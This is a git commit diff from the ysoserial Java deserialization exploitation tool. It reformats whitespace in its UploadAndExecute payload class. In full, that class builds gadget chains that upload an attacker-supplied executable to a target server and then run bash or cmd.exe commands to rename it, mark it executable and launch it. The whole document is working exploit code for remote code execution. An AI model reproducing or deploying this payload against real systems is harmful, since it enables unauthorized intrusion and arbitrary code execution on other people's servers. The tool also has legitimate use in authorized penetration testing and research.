8db72e9cdf5e24b5ad1bbfcc2063c3231eea487c
Jacob Baines <baines.jacob@gmail.com>
2016-04-30 12:17:31 -0700

    Cleaned up spacing

--- src/main/java/ysoserial/payloads/UploadAndExecute.java
+++ src/main/java/ysoserial/payloads/UploadAndExecute.java
@@ -44,14 +44,13 @@ import ysoserial.payloads.util.PayloadRunner;
 @SuppressWarnings({ "rawtypes" })
 public class UploadAndExecute implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		
-		// command should be split into "uploaddir:file_path:os:gadgetname"
+    public Object getObject(final String command) throws Exception {
+	    // command should be split into "uploaddir:file_path:os:gadgetname"
         String[] commands = command.split(",");
         if (commands.length != 4) {
             throw new IllegalArgumentException("Unknown command format. Bad arg count.");
         }
-        
+
         if (commands[3].equalsIgnoreCase("CommonsCollections1") ||
         	commands[3].equalsIgnoreCase("CommonsCollections5")) {
         	throw new IllegalArgumentException("This gadget doesn't currently support CC1 or CC5.");
@@ -61,43 +60,44 @@ public class UploadAndExecute implements ObjectPayload<Object> {
         if (commands[0].endsWith("/") || commands[0].endsWith("\\")) {
         	commands[0] = commands[0].substring(0, commands[0].length() - 1);
         }
-        
+
         // Load the file into a string - FileUpload1 requires binary data to be base64 encoded
         File executable = new File(commands[1]);
         if (!executable.exists() || !executable.isFile()) {
         	throw new IOException("Invalid file: does not exist or isn't a file");
         }
         String executableData = Base64.encodeBase64String(Files.readAllBytes(Paths.get(executable.toURI())));
-        
+
         // Generate the FileUpload1 gadget
-		LinkedList<Object> upExecList = new LinkedList<Object>();
-		final Class<? extends ObjectPayload> uploadClass = Utils.getPayloadClass("FileUpload1");
-		final ObjectPayload uploadPayload = uploadClass.newInstance();
-		upExecList.add(uploadPayload.getObject("writeB64," + commands[0] + "," + executableData));
+        LinkedList<Object> upExecList = new LinkedList<Object>();
+        final Class<? extends ObjectPayload> uploadClass = Utils.getPayloadClass("FileUpload1");
+        final ObjectPayload uploadPayload = uploadClass.newInstance();
+        upExecList.add(uploadPayload.getObject("writeB64," + commands[0] + "," + executableData));
 
-		// Our command will require wildcard expansion which requires /bin/bash or similar.
-		// So we will frame the command up in a new String[]. The command renames the uploaded
-		// file, sets the executable bit, and executes.
-		String execCommand = "new String[] {";
-		if (commands[2].equalsIgnoreCase("linux")) {
-			execCommand += "\"/bin/bash\", \"-c\", \"mv " + commands[0] +
-				"/upload_*.tmp " + commands[0] + "/exec.bin && chmod +x " +
-				commands[0] + "/exec.bin && " + commands[0] + "/exec.bin\" }";
-		} else if (commands[2].equalsIgnoreCase("windows")) {
-			execCommand += "\"cmd.exe\", \"/c\", " +
-				"\"cd " + commands[0] + " && mv upload_*.tmp exec.exe && chmod +x exec.exe && start exec.exe\" }";
-		} else {
-			throw new IllegalArgumentException("Unknown os provided.");
-		}
+	    // Our command will require wildcard expansion which requires /bin/bash or similar.
+	    // So we will frame the command up in a new String[]. The command renames the uploaded
+	    // file, sets the executable bit, and executes.
+	    String execCommand = "new String[] {";
+	    if (commands[2].equalsIgnoreCase("linux")) {
+		    execCommand += "\"/bin/bash\", \"-c\", \"mv " + commands[0] +
+		        "/upload_*.tmp " + commands[0] + "/exec.bin && chmod +x " +
+			    commands[0] + "/exec.bin && " + commands[0] + "/exec.bin\" }";
+	    } else if (commands[2].equalsIgnoreCase("windows")) {
+		    execCommand += "\"cmd.exe\", \"/c\", " +
+			    "\"cd " + commands[0] + " && mv upload_*.tmp exec.exe && chmod +x exec.exe && start exec.exe\" }";
+	    } else {
+		    throw new IllegalArgumentException("Unknown os provided.");
+	    }
 
-		// Create the gadget that will execute our command
-		final Class<? extends ObjectPayload> execClass = Utils.getPayloadClass(commands[3]);
-		final ObjectPayload execPayload = execClass.newInstance();
-		upExecList.add(execPayload.getObject(execCommand));
-		return upExecList;
-	}
+	    // Create the gadget that will execute our command
+	    final Class<? extends ObjectPayload> execClass = Utils.getPayloadClass(commands[3]);
+	    final ObjectPayload execPayload = execClass.newInstance();
+	    upExecList.add(execPayload.getObject(execCommand));
+	    return upExecList;
+    }
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(UploadAndExecute.class, args);
-	}
+    public static void main(final String[] args) throws Exception {
+	    PayloadRunner.run(UploadAndExecute.class, args);
+    }
 }
+
